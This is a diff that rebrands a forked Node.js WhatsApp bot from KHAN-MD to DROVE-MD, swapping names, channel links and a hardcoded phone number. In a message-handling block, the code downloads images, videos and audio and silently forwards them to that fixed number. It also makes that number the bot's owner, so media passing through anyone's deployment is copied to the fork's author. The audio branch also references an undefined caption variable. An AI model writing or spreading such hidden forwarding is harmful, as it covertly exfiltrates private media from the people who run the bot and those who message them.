@@ -41,7 +41,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['923146190772']
+  const ownerNumber = ['923471728690']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -65,7 +65,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("KHAN-MD~", '');
+const sessdata = config.SESSION_ID.replace("DROVE-MD~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -108,9 +108,9 @@ console.log("Session downloaded ✅")
   }
   });
   console.log('Plugins installed successful ✅')
-  console.log('Bot connected to whatsapp ✅')
+  console.log('Drove-Md connected to whatsapp ✅')
   
-  let up = `*Hello there KHAN-AI User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet KHAN-AI WhatsApp Bot.\n\n *Thanks for using KHAN-AI \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VatOy2EAzNc2WcShQw1j\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/JawadYTX/KHAN-AI\n\n> © Powered BY JawadTechX \ud83d\udda4`;
+  let up = `*Hello there DROVE-MD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet DROVE-MD WhatsApp Bot.\n\n *Thanks for using DROVE-MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029Vank3vaLikg5ldoNdd0U\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/FarhanAli690/DROVE-MD\n\n> © Powered BY Walk-Drove\ud83d\udda4`;
   conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/89xq3r.jpg` }, caption: up })
   }
   })
@@ -144,14 +144,14 @@ console.log("Session downloaded ✅")
     if (jawadik.message.imageMessage) {
     let cap = jawadik.message.imageMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-    return conn.sendMessage("923146190772@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("923471728690@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-    return conn.sendMessage("923146190772@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("923471728690@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("923146190772@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("923471728690@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -526,7 +526,7 @@ console.log("Session downloaded ✅")
          
   //================ownerreact==============
   
-  if(senderNumber.includes("923146190772")){
+  if(senderNumber.includes("923471728690")){
   if(isReact) return
   m.react("👑")
   }
@@ -612,7 +612,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("KHAN-MD STARTED ✅");
+  res.send("DROVE-MD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
